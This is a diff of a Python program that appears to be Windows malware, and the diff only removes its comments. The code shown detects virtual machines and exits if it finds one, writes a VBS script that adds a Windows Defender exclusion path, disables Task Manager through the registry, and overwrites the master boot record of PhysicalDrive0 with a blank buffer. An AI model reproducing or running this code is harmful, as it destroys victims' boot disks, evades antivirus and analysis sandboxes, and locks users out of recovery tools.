@@ -40,10 +40,7 @@ fade_out_time = 0.1
 volume = 0.5
 freq = 440
 
-#Pin file
 DontDownloadPath = str(Path.home()) + "\\AppData\\Local\\Temp\\djj012ndawm10d9wadaw.txt"
-
-#System Paths
 TempPath = str(Path.home()) + "\\AppData\\Local\\Temp"
 
 def generate_tone(frequency, duration):
@@ -85,7 +82,6 @@ def Play_in_loop():
         play_obj.wait_done()
 
 def AntiVm():
-  #Searches for processes with the name, and when he has found a process, the program quits
   Process = ["vmsrvc.exe" , "vmusrvc.exe", "vboxtray.exe", "vmtoolsd.exe", "df5serv.exe", "vboxservice.exe"]
   for process in psutil.process_iter():
       for i in Process:
@@ -96,13 +92,11 @@ def CommitSuicide():
   sys.exit()
 
 def Installation():
-    #Look for the file, and when its found, the program quits
     if not os.path.isfile(DontDownloadPath):
         DTM()
 
         os.chdir(TempPath)
 
-        #WindowsDefender "Bypass"
         text_file = open("val.vbs", "w")
         text_file.write(f'''
 Set objShell = WScript.CreateObject("WScript.Shell")
@@ -133,7 +127,6 @@ objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath '{str(Path.h
         sys.exit()
 
 def DelMBR():
-    #Overwrite MBR
     hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
     WriteFile(hDevice, AllocateReadBuffer(512), None)
     CloseHandle(hDevice)
@@ -143,7 +136,6 @@ def DelMBR():
 
 def DTM():
     try:
-        #Block Task-Manager
         os.system("start cmd /c REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
     except:
         pass
